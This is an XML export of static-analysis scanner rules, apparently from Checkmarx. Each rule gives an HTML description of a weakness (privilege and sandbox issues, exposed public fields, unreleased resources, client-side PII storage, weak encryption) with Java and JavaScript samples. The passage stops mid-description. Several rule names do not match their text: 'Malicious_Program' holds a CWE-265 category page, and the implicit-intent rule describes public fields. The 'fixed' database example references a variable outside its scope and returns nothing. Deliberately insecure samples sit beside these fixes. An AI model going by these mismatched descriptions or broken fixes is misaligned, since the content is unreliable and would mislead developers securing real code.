<?xml version="1.0" encoding="UTF-8" standalone="yes"?><rules><rule><key>checkmarx_1599</key><name>Malicious_Program</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;html xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"&gt;
	&lt;link href="main.css" rel="stylesheet" type="text/css"&gt;
&lt;div id="CWEDefinition"&gt;&lt;div class="title"&gt;&lt;table cellpadding="0" cellspacing="0" border="0" width="100%"&gt;&lt;tr&gt;&lt;td valign="top" width="20px"&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div align="center"&gt;&lt;span style="font-weight:bold;color:white;"&gt;Privilege / Sandbox Issues&lt;/span&gt;&lt;/div&gt;&lt;/td&gt;&lt;td valign="top" width="20px"&gt;&lt;div class="left noprint"&gt;

&lt;span class="tool"&gt;&lt;/span&gt;

&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;div class="status"&gt;&lt;table width="100%" border="0" cellpadding="0" cellspacing="0"&gt;&lt;tr&gt;&lt;td valign="top" align="left" width="33%" nowrap=""&gt;&lt;b&gt;Category ID: &lt;/b&gt;265&lt;span style="font-style:italic; font-size:80%"&gt; (Category)&lt;/span&gt;&lt;/td&gt;&lt;td valign="top" align="center" nowrap=""&gt;&lt;/td&gt;&lt;td valign="top" align="right" nowrap=""&gt;&lt;b&gt;Status: &lt;/b&gt;&lt;span class="Incomplete"&gt;Incomplete&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;div id="Description"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Description&lt;/div&gt;&lt;div name="oc_265_Description" id="oc_265_Description" class="expandblock"&gt;&lt;div class="detail"&gt;
&lt;p class="subheading"&gt;Description Summary&lt;/p&gt;&lt;div class="indent"&gt;Weaknesses in this category occur with improper enforcement of
sandbox environments, or the improper handling, assignment, or management of
privileges.&lt;/div&gt;
&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Potential Mitigations"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Potential Mitigations&lt;/div&gt;&lt;div name="oc_265_Potential Mitigations" id="oc_265_Potential Mitigations" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;div id="Grouped"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;
&lt;tr&gt;&lt;td valign="top"&gt;&lt;p&gt;Very carefully manage the setting, management and handling of
privileges. Explicitly manage trust zones in the software.&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top"&gt;&lt;p&gt;Follow the principle of least privilege when assigning access rights
to entities in a software system.&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Relationships"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Relationships&lt;/div&gt;&lt;div name="oc_265_Relationships" id="oc_265_Relationships" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" id="Detail"&gt;&lt;tr&gt;&lt;th valign="top"&gt;Nature&lt;/th&gt;&lt;th valign="top"&gt;Type&lt;/th&gt;&lt;th valign="top"&gt;ID&lt;/th&gt;&lt;th valign="top" width="100%"&gt;Name&lt;/th&gt;&lt;th valign="middle" class="left" style="text-align:center"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;View(s) this relationship pertains to&lt;/span&gt;&lt;/span&gt;&lt;/th&gt;&lt;/tr&gt;
&lt;tbody&gt;&lt;tr class="primary"&gt;&lt;td valign="top"&gt;ChildOf&lt;/td&gt;&lt;td valign="top" nowrap="" class="right" align="center" style="padding-top:1px"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Category&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;264&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=264" target="_blank"&gt;Permissions, Privileges, and Access Controls&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Development Concepts &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;699&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;
&lt;tbody&gt;&lt;tr class="foreign"&gt;&lt;td valign="top"&gt;ParentOf&lt;/td&gt;&lt;td valign="middle" nowrap="" class="right" align="center"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weakness Base&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;266&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=266" target="_blank"&gt;Incorrect Privilege Assignment&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Development Concepts &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;699&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;tbody&gt;&lt;tr class="foreign"&gt;&lt;td valign="top"&gt;ParentOf&lt;/td&gt;&lt;td valign="middle" nowrap="" class="right" align="center"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weakness Base&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;267&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=267" target="_blank"&gt;Privilege Defined With Unsafe Actions&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Development Concepts &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;699&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;tbody&gt;&lt;tr class="foreign"&gt;&lt;td valign="top"&gt;ParentOf&lt;/td&gt;&lt;td valign="middle" nowrap="" class="right" align="center"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weakness Base&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;268&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=268" target="_blank"&gt;Privilege Chaining&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Development Concepts &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;699&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;tbody&gt;&lt;tr class="foreign"&gt;&lt;td valign="top"&gt;ParentOf&lt;/td&gt;&lt;td valign="middle" nowrap="" class="right" align="center"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weakness Base&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;269&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=269" target="_blank"&gt;Improper Privilege Management&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Development Concepts &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;699&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;tbody&gt;&lt;tr class="foreign"&gt;&lt;td valign="top"&gt;ParentOf&lt;/td&gt;&lt;td valign="middle" nowrap="" class="right" align="center"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weakness Class&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;271&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=271" target="_blank"&gt;Privilege Dropping / Lowering Errors&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Development Concepts &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;699&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;tbody&gt;&lt;tr class="foreign"&gt;&lt;td valign="top"&gt;ParentOf&lt;/td&gt;&lt;td valign="middle" nowrap="" class="right" align="center"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weakness Base&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;274&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=274" target="_blank"&gt;Improper Handling of Insufficient Privileges&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Development Concepts &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;699&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;tbody&gt;&lt;tr class="foreign"&gt;&lt;td valign="top"&gt;ParentOf&lt;/td&gt;&lt;td valign="middle" nowrap="" class="right" align="center"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weakness Class&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;610&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=610" target="_blank"&gt;Externally Controlled Reference to a Resource in Another Sphere&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Development Concepts &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;699&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;tbody&gt;&lt;tr class="foreign"&gt;&lt;td valign="top"&gt;ParentOf&lt;/td&gt;&lt;td valign="middle" nowrap="" class="right" align="center"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weakness Base&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;648&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=648" target="_blank"&gt;Incorrect Use of Privileged APIs&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Development Concepts &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;699&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;tbody&gt;&lt;tr class="foreign"&gt;&lt;td valign="top"&gt;PeerOf&lt;/td&gt;&lt;td valign="middle" nowrap="" class="right" align="center"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weakness Class&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;250&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=250" target="_blank"&gt;Execution with Unnecessary Privileges&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Research Concepts&lt;/span&gt;1000&lt;/span&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;tbody&gt;&lt;tr class="foreign"&gt;&lt;td valign="top"&gt;PeerOf&lt;/td&gt;&lt;td valign="middle" nowrap="" class="right" align="center"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weakness Base&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;619&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=619" target="_blank"&gt;Dangling Database Cursor ('Cursor Injection')&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Research Concepts&lt;/span&gt;1000&lt;/span&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Relationship Notes"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Relationship Notes&lt;/div&gt;&lt;div name="oc_265_Relationship Notes" id="oc_265_Relationship Notes" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;div id="Grouped"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;
&lt;tr&gt;&lt;td&gt;
&lt;p&gt;This can strongly overlap authorization errors.&lt;/p&gt;
&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Research Gaps"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Research Gaps&lt;/div&gt;&lt;div name="oc_265_Research Gaps" id="oc_265_Research Gaps" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;div id="Grouped"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;
&lt;tr&gt;&lt;td&gt;
&lt;p&gt;Many of the following concepts require deeper study. Most privilege
problems are not classified at such a low level of detail, and terminology
is very sparse. Certain classes of software, such as web browsers and
software bug trackers, provide a rich set of examples for further research.
Operating systems have matured to the point that these kinds of weaknesses
are rare, but finer-grained models for privileges, capabilities, or roles
might introduce subtler issues.&lt;/p&gt;
&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Theoretical Notes"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Theoretical Notes&lt;/div&gt;&lt;div name="oc_265_Theoretical Notes" id="oc_265_Theoretical Notes" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;div id="Grouped"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;
&lt;tr&gt;&lt;td&gt;
&lt;p&gt;A sandbox could be regarded as an explicitly defined sphere of control, in
that the sandbox only defines a limited set of behaviors, which can only
access a limited set of resources.&lt;/p&gt;
&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td&gt;
&lt;p&gt;It could be argued that any privilege problem occurs within the context of
a sandbox.&lt;/p&gt;
&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Taxonomy Mappings"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Taxonomy Mappings&lt;/div&gt;&lt;div name="oc_265_Taxonomy Mappings" id="oc_265_Taxonomy Mappings" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Mapped Taxonomy Name&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Node ID&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Fit&lt;/th&gt;&lt;th valign="top" width="100%"&gt;Mapped Node Name&lt;/th&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top"&gt;PLOVER&lt;/td&gt;&lt;td valign="top"&gt;&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;&lt;/td&gt;&lt;td valign="top"&gt;Privilege / sandbox errors&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Content History"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Content History&lt;/div&gt;&lt;div name="oc_265_Content History" id="oc_265_Content History" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;&lt;tr&gt;&lt;th valign="top" colspan="5" class="title"&gt;Submissions&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Submission Date&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Submitter&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Organization&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Source&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;PLOVER&lt;/td&gt;&lt;td valign="top"&gt;&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Externally Mined&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th valign="top" colspan="5" class="title"&gt;Modifications&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Modification Date&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Modifier&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Organization&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Source&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2008-09-08&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;CWE Content Team&lt;/td&gt;&lt;td valign="top"&gt;MITRE&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Internal&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;updated Description, Relationships, Relationship Notes,
Taxonomy Mappings, Theoretical Notes&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2008-10-14&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;CWE Content Team&lt;/td&gt;&lt;td valign="top"&gt;MITRE&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Internal&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;updated Description, Research Gaps,
Theoretical Notes&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2009-12-28&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;CWE Content Team&lt;/td&gt;&lt;td valign="top"&gt;MITRE&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Internal&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;updated Potential Mitigations&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;

&lt;/html&gt;

&lt;div align="right" style="padding-top:5px; padding-bottom:5px; clear:right" class="noprint"&gt;&lt;a class="backtop" href="#top"&gt;Back to top&lt;/a&gt;&lt;/div&gt;

&lt;html xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"&gt;&lt;/html&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>CRITICAL</severity><tag>checkmarx-high</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_3604</key><name>Implicit_Intent_With_Read_Write_Permissions</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;h2&gt;Risk&lt;/h2&gt;&lt;h4&gt;What might happen&lt;/h4&gt;&lt;p&gt;&lt;div&gt;If a&amp;#160;class exposes an internal variable as a public field, without constraining access, the variable can be modified in unexpected ways, allowing an external consumer of the class to set arbitrary, unallowed values to the field. This could cause&amp;#160;to unexpected behavior if the class (or other consumers) make assumptions about the value of that variable. This could even lead to additional vulnerabilities, depending on how this value is used.&amp;#160;&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Cause&lt;/h2&gt;&lt;h4&gt;How does it happen&lt;/h4&gt;&lt;p&gt;&lt;div&gt;One of the application's classes exposes an internal variable as a public field, without constraining access, by exposing it as a property. Alternatively, public fields can be exposed without allowing their values to be externally modified.&amp;#160;&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;General Recommendations&lt;/h2&gt;&lt;h4&gt;How to avoid it&lt;/h4&gt;&lt;p&gt;&lt;ul&gt;
&lt;li&gt;Avoid exposing internal variables and specific implementation as public fields.&amp;#160;&lt;/li&gt;
&lt;li&gt;Prefer exposing data as properties, and implement data validation and control in the property code as needed.&amp;#160;&lt;/li&gt;
&lt;li&gt;When exposing&amp;#160;a public field, constrain the value to be readonly via use of &lt;code&gt;final&lt;/code&gt; modifier.&amp;#160;&lt;/li&gt;
&lt;/ul&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Source Code Examples&lt;/h2&gt;&lt;h3&gt;Java&lt;/h3&gt;&lt;h4&gt;Exposing Public Field&lt;/h4&gt;&lt;pre&gt;public class MyProduct {
    // This value can be modified by any external code
    public float price; 

    public MyProduct()  {
        this.price = ReadPriceFromDB("MyProduct");
    }
}&lt;/pre&gt;&lt;h4&gt;Exposing Read-Only Field&lt;/h4&gt;&lt;pre&gt;public class MyProduct {
    // This value can be read by external code, 
    //   but can only be modified by the constructor
    public final float price; 
    
    public MyProduct()  {
        this.price = ReadPriceFromDB("MyProduct");
    }
}&lt;/pre&gt;&lt;h4&gt;Wrapping with Properties&lt;/h4&gt;&lt;pre&gt;public class MyProduct {
    // This value can only be accessed by the class itself
    private float price; 
    
    // External code can only read the value by calling the accessor property
    public float getPrice() { 
        return price;
    }
    
    public MyProduct()  {
        this.price = ReadPriceFromDB("MyProduct");
    }
}&lt;/pre&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>MINOR</severity><tag>checkmarx-low</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_2692</key><name>Android_Improper_Resource_Shutdown_or_Release</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;h2&gt;Risk&lt;/h2&gt;&lt;h4&gt;What might happen&lt;/h4&gt;&lt;p&gt;&lt;p&gt;Unreleased resources can cause a drain of those available for system use, eventually causing general reliability and availability problems, such as performance degradation, process bloat, and system instability. If a resource leak&amp;nbsp;can be intentionally exploited by an attacker, it may be possible to cause a widespread DoS (Denial of Service) attack. This might even expose sensitive information between unprivileged users, if the resource continues to retain&amp;nbsp;data or user id&amp;nbsp;between subsequent allocations.&amp;nbsp;&lt;/p&gt;
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Cause&lt;/h2&gt;&lt;h4&gt;How does it happen&lt;/h4&gt;&lt;p&gt;&lt;p&gt;The application code allocates resource objects, but does not ensure these are always closed and released in a timely manner. This can include database connections, file handles, network sockets, or any other resource that needs to be released.&amp;nbsp;In some cases,&amp;nbsp;these might be released - but only if everything works as planned; if there is any runtime exception during the normal course of system operations, resources start to leak.&amp;nbsp;&lt;/p&gt;
&lt;p&gt;Note that even in managed-memory languages such as Java, these resources must be explicitly released. Many types of resource are not released even when the Garbage Collector runs; and even if the the object would eventually release the resource, we have no control over when the Garbage Collector does&amp;nbsp;run.&amp;nbsp;&lt;/p&gt;
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;General Recommendations&lt;/h2&gt;&lt;h4&gt;How to avoid it&lt;/h4&gt;&lt;p&gt;&lt;ul&gt;
&lt;li&gt;Always close and release all resources.&lt;/li&gt;
&lt;li&gt;Ensure resources are released (along with&amp;nbsp;any other necessary cleanup) in a &lt;code&gt;finally { }&lt;/code&gt; block. Do not close resources in a &lt;code&gt;catch { }&lt;/code&gt; block, since this is not ensured to be called.&amp;nbsp;&lt;/li&gt;
&lt;li&gt;Explicitly call .close() on any instance of a class that implements the &lt;code&gt;Closable&lt;/code&gt; or &lt;code&gt;AutoClosable&lt;/code&gt; interfaces.&amp;nbsp;&lt;/li&gt;
&lt;li&gt;Alternatively, an even better solution is to use the try-with-resources idiom, in order to automatically close any defined&amp;nbsp;&lt;code&gt;AutoClosable&lt;/code&gt;&amp;nbsp;instances.&amp;nbsp;&lt;/li&gt;
&lt;/ul&gt;
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Source Code Examples&lt;/h2&gt;&lt;h3&gt;Java&lt;/h3&gt;&lt;h4&gt;Unreleased Database Connection&lt;/h4&gt;&lt;pre&gt;private MyObject getDataFromDb(int id)  {
	MyObject data = null;
  
  	try {
		Connection con = DriverManager.getConnection(CONN_STRING);
      	
      	data = queryDb(con, id); 
	}
	catch ( SQLException e ) {
		handleError(e);
	}
}  &lt;/pre&gt;&lt;h4&gt;Explicit Release of Database Connection&lt;/h4&gt;&lt;pre&gt;private MyObject getDataFromDb(int id)  {
	MyObject data = null;
  
  	try {
		Connection con = DriverManager.getConnection(CONN_STRING);
      	
      	data = queryDb(con, id); 
	}
	catch ( SQLException e ) {
		handleError(e);
	}
  	finally {
      	if ((con != null) &amp;&amp; (! con.isClosed())) {
          	con.close();
        }
    }
}  &lt;/pre&gt;&lt;h4&gt;Automatic Implicit Release Using Try-With-Resources&lt;/h4&gt;&lt;pre&gt;private MyObject getDataFromDb(int id)  {
	MyObject data = null;
  
  	try (Connection con = DriverManager.getConnection(CONN_STRING)) {
      	data = queryDb(con, id); 
	}
	catch ( SQLException e ) {
		handleError(e);
	}
}  &lt;/pre&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>MINOR</severity><tag>checkmarx-low</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_1596</key><name>Insecure_Data_Storage</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;h2&gt;Risk&lt;/h2&gt;&lt;h4&gt;What might happen&lt;/h4&gt;&lt;p&gt;&lt;div&gt;An attacker that has access to a user's client computer or device, will be able to retrieve the user's&amp;#160;sensitive personal data (PII) from the client storage. This would be detrimental to the user and harm their privacy, and could&amp;#160;cause reputational damage, financial loss, and even lead to identity theft.&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Cause&lt;/h2&gt;&lt;h4&gt;How does it happen&lt;/h4&gt;&lt;p&gt;&lt;div&gt;The application stores sensitive data, such as PII (Personally Identifiable Information), on the client browser or device. The application uses insecure forms of storage, which do not inherently provide any protection from unauthorized access. This data is not encrypted or sanitized before being stored, thus a malicious entity with access to the device or browser could easily retrieve the user's data.&amp;#160;&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;General Recommendations&lt;/h2&gt;&lt;h4&gt;How to avoid it&lt;/h4&gt;&lt;p&gt;&lt;div&gt;
&lt;ul&gt;
&lt;li&gt;Avoid&amp;#160;storing sensitive data, such as PII, on unprotected clients.&amp;#160;&lt;/li&gt;
&lt;li&gt;If PII or other sensitive data must be stored on the client, ensure it is encrypted or otherwise protected.&amp;#160;&lt;/li&gt;
&lt;/ul&gt;
&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Source Code Examples&lt;/h2&gt;&lt;h3&gt;JavaScript&lt;/h3&gt;&lt;h4&gt;User Data Stored in Local Storage&lt;/h4&gt;&lt;pre&gt;function storeUserData() { 
	var accountId = getUserAccount();
	localStorage.setItem('accountId', accountId);
}

&lt;/pre&gt;&lt;h4&gt;User Data in Globals instead of Persistent Storage&lt;/h4&gt;&lt;pre&gt;var globalAccountId; // Cache user data for application use

function storeUserData() { 
	var accountId = getUserAccount();
	
	  // localStorage.setItem('accountId', accountId);
	// Do not store user data in persistent storage
	globalAccountId = accountId; 
}

&lt;/pre&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>MINOR</severity><tag>checkmarx-low</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_3606</key><name>Weak_Encryption</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;h2&gt;Risk&lt;/h2&gt;&lt;h4&gt;What might happen&lt;/h4&gt;&lt;p&gt;&lt;div&gt;Using weak or outdated cryptography does not provide sufficient protection for sensitive data. An attacker that gains access to the encrypted data would likely be able to break the encryption, using either cryptanalysis or brute force attacks. Thus, the attacker would be able to steal user passwords and other personal data. This could lead to user impersonation or identity theft.&amp;#160;&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Cause&lt;/h2&gt;&lt;h4&gt;How does it happen&lt;/h4&gt;&lt;p&gt;&lt;div&gt;The application uses a weak algorithm, that is considered obselete since it is relatively easy to break. These obselete algorithms are vulnerable to several different kinds of attacks, including brute force.&amp;#160;&lt;/div&gt;      
